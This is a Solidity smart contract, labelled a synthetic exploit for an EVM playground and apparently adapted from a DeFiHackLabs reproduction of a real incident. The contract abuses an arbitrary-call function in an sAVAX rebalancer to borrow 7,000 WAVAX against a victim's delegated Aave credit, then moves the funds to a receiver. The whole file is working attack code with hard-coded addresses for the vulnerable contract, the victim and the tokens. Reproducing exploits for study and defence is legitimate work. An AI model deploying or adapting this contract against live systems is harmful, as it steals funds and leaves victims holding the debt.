// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// SYNTHETIC exploit for the EVM Playground — a standalone contract reproducing the inline attack
// from DeFiHackLabs' AaveRebalancerCreditDelegation_exp.sol (the Foundry test runs the attack as
// address(this)). Here the same logic lives in a deployable contract whose run() drives it and
// forwards the WAVAX profit to `receiver`. The Foundry `deal(USDC/sAVAX, ...)` calls are replaced by
// the playground's dealToken setup (which funds this contract before run()).
//
// Bug: the sAVAX rebalancer exposes a function (selector 0xb2a13230, args (uint256 amount, address
// target, bytes data, bool)) that executes the caller-supplied target/data FROM THE REBALANCER'S OWN
// ADDRESS. The victim had delegated unlimited WAVAX borrowing power to the rebalancer, so the
// attacker calls Aave Pool.borrow(WAVAX, 7000e18, 2, 0, victim) through that surface: Aave mints
// variable WAVAX debt to the victim and sends the WAVAX to the rebalancer, which a second arbitrary
// call then transfers out to the attacker.

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IAavePool {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf) external;
    function repay(address asset, uint256 amount, uint256 interestRateMode, address onBehalfOf) external returns (uint256);
}

interface IVariableDebtToken {
    function approveDelegation(address delegatee, uint256 amount) external;
    function balanceOf(address user) external view returns (uint256);
}

contract AaveRebalancerExploit {
    address constant VULNERABLE_REBALANCER = 0x7A7bAB45363Efb0394Ff27bfA29bb7C0534cA8C9;
    address constant VICTIM = 0x6fDAE9edACc6461b21f71a1a6a420197D2b0C3aa;
    address constant AAVE_POOL = 0x794a61358D6845594F94dc1DB02A252b5b4814aD;
    address constant WAVAX = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7;
    address constant SAVAX = 0x2b2C81e08f1Af8835a78Bb2A90AE924ACE0eA4bE;
    address constant USDC = 0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E;
    address constant VARIABLE_DEBT_WAVAX = 0x4a1c3aD6Ed28a636ee1751C69071f6be75DEb8B8;

    uint256 constant SETUP_BORROW_AMOUNT = 0.01 ether;
    uint256 constant SAVAX_DEPOSIT_PER_REBALANCE = 0.001 ether;
    uint256 constant MALICIOUS_BORROW_AMOUNT = 7_000 ether;

    address private immutable receiver;

    constructor(address receiver_) {
        receiver = receiver_;
    }

    function run() external {
        // step 1: a tiny local Aave position so the rebalancer's normal borrow path is available.
        IERC20(USDC).approve(AAVE_POOL, type(uint256).max);
        IERC20(WAVAX).approve(AAVE_POOL, type(uint256).max);
        IAavePool(AAVE_POOL).supply(USDC, 1e6, address(this), 0);
        IVariableDebtToken(VARIABLE_DEBT_WAVAX).approveDelegation(VULNERABLE_REBALANCER, type(uint256).max);

        // step 2: victim-funded Aave borrow, executed from the rebalancer via its arbitrary-call surface.
        IERC20(SAVAX).transfer(VULNERABLE_REBALANCER, SAVAX_DEPOSIT_PER_REBALANCE);
        bytes memory borrowFromVictim =
            abi.encodeWithSelector(IAavePool.borrow.selector, WAVAX, MALICIOUS_BORROW_AMOUNT, 2, uint16(0), VICTIM);
        _callRebalancer(SETUP_BORROW_AMOUNT, AAVE_POOL, borrowFromVictim);

        // step 3: same surface transfers the acquired WAVAX out to this contract.
        IERC20(SAVAX).transfer(VULNERABLE_REBALANCER, SAVAX_DEPOSIT_PER_REBALANCE);
        uint256 amountAvailable = IERC20(WAVAX).balanceOf(VULNERABLE_REBALANCER) + SETUP_BORROW_AMOUNT;
        bytes memory pullWavax = abi.encodeWithSelector(IERC20.transfer.selector, address(this), amountAvailable);
        _callRebalancer(SETUP_BORROW_AMOUNT, WAVAX, pullWavax);

        // step 4: repay only our own small setup debt; the victim's 7000-WAVAX debt remains as impact.
        uint256 localSetupDebt = IVariableDebtToken(VARIABLE_DEBT_WAVAX).balanceOf(address(this));
        IAavePool(AAVE_POOL).repay(WAVAX, localSetupDebt, 2, address(this));

        // step 5: forward the WAVAX profit to the attacker.
        IERC20(WAVAX).transfer(receiver, IERC20(WAVAX).balanceOf(address(this)));
    }

    function _callRebalancer(uint256 amount, address target, bytes memory data) private {
        (bool ok, bytes memory returnData) =
            VULNERABLE_REBALANCER.call(abi.encodeWithSelector(bytes4(0xb2a13230), amount, target, data, true));
        if (!ok) {
            assembly {
                revert(add(returnData, 0x20), mload(returnData))
            }
        }
    }
}
